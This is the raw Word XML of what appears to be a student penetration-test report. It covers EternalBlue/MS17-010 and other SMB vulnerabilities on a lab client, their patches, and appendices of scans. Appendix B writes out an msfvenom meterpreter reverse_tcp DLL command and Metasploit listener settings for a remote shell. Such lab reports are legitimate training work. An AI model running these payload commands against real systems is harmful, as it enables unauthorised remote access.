        </w:rPr>
        <w:t xml:space="preserve"> most severe </w:t>
      </w:r>
      <w:r w:rsidR="00EA0256">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>vulnerabilities on the system are the MS11-058 attack, that targets the DNS server, the MS17-010 attack that was completed – which targeted the SMB server, and several other SMB vulnerabilities. Client 1 was also vulnerable to FTP server attacks. For an extended list of vulnerabilities, see appendix E.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRPr="009525A9" w:rsidRDefault="009525A9" w:rsidP="00857EDD">
      <w:pPr>
        <w:spacing w:after="158"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="00D3436B" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D3436B" w:rsidRDefault="00D3436B" w:rsidP="00D3436B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft have now released a patch for the MS17-010 exploit. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>In order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stop being exploited by this vulnerability, the patch needs to be downloaded from Microsoft security website. The link can be found here: </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:history="1">
        <w:r w:rsidRPr="00015439">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:t>https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D3436B" w:rsidRDefault="00D3436B" w:rsidP="00D3436B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>By installing this</w:t>
      </w:r>
      <w:r w:rsidR="00692399">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">patch, the system will no longer be vulnerable to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00692399">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> either.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D3436B" w:rsidRDefault="00D3436B" w:rsidP="00D3436B">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>In order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> update the other vulnerabilities, the best thing to do is install the other patches on the windows </w:t>
      </w:r>
      <w:r w:rsidR="00692399">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">security site, searching for the relevant code to the patch (The code can be found in appendix D). </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC7FA6" w:rsidRPr="00692399" w:rsidRDefault="00692399">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Another way to remain secure is by updating to the operating system being used to a more up to date operating system. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F4C01" w:rsidRDefault="00341658">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="5" w:name="_Toc453256709" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="566773658"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w:rsidR="006E34CB" w:rsidRDefault="00341658" w:rsidP="00341658">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:ind w:left="431"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
          <w:bookmarkEnd w:id="5"/>
        </w:p>
        <w:sdt>
          <w:sdtPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtContent>
            <w:p w:rsidR="003B009F" w:rsidRDefault="003B009F" w:rsidP="00692399">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
                <w:rPr>
                  <w:b/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00866889">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>URLs</w:t>
              </w:r>
              <w:r w:rsidR="00692399">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>:</w:t>
              </w:r>
            </w:p>
            <w:p w:rsidR="00692399" w:rsidRDefault="00692399" w:rsidP="00692399">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
                <w:rPr>
                  <w:b/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:t>Microsoft security updates</w:t>
              </w:r>
            </w:p>
            <w:p w:rsidR="00692399" w:rsidRPr="00692399" w:rsidRDefault="00692399" w:rsidP="00692399">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:r w:rsidRPr="00692399">
                <w:t>https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010</w:t>
              </w:r>
            </w:p>
            <w:p w:rsidR="00801886" w:rsidRPr="006E34CB" w:rsidRDefault="008F27B2">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="006C6590" w:rsidRDefault="006C6590">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00341658" w:rsidRDefault="00341658">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00801886" w:rsidRDefault="00341658" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="431"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc453256710"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRDefault="007504C1" w:rsidP="007504C1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="7"/>
      <w:r w:rsidRPr="007504C1">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Appendix A</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A7605" w:rsidRPr="002A7605" w:rsidRDefault="002A7605" w:rsidP="002A7605">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">TCP Scans on </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> the machines:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRDefault="007504C1" w:rsidP="007504C1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3177A375" wp14:editId="55C694FF">
            <wp:extent cx="5943600" cy="3663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268" r="33173" b="20512"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="3663125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRDefault="007504C1" w:rsidP="007504C1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="746D636F" wp14:editId="238C7E41">
            <wp:extent cx="5393543" cy="272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62" r="36859" b="35043"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5398407" cy="2726607"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRDefault="007504C1" w:rsidP="007504C1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7BE71351" wp14:editId="6ADD0CE0">
            <wp:extent cx="5460503" cy="37242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10257" r="33975" b="9687"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5467046" cy="3728738"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRPr="007504C1" w:rsidRDefault="007504C1" w:rsidP="007504C1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CB9E897" wp14:editId="431CBA4D">
            <wp:extent cx="5943600" cy="40237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02" r="32532" b="9402"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4023797"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007504C1" w:rsidRPr="007504C1" w:rsidRDefault="00341658" w:rsidP="007504C1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc453256711"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009A241B" w:rsidRDefault="0043674B" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>Fuzzbunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0038524F" w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0038524F" w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0038524F" w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0038524F" w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>doublepulsar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0038524F" w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> code: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">Code used to create the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> -p windows/x64/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST=192.168.0.100 LPORT=4444 -f </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; /root/Desktop/msf.dll</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRDefault="0038524F" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>ode used to set Armitage to listening to port 4444</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="00415D15" w:rsidRDefault="0038524F" w:rsidP="0038524F">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>use exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="00415D15" w:rsidRDefault="0038524F" w:rsidP="0038524F">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>set payload windows/x64/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="00415D15" w:rsidRDefault="0038524F" w:rsidP="0038524F">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lhost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.0.100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="00415D15" w:rsidRDefault="0038524F" w:rsidP="0038524F">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRPr="00415D15" w:rsidRDefault="0038524F" w:rsidP="0038524F">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415D15">
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>run</w:t>
      </w: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roofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>fuzzbunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>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318A2492" wp14:editId="1BA9B7BA">
            <wp:extent cx="5038725" cy="72966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4768" b="9297"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5040065" cy="7298585"/>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r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">Eternal blue: </w:t>
      </w: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1E743F58" wp14:editId="6CAEC65E">
            <wp:extent cx="5038725" cy="72966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4768" b="9297"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
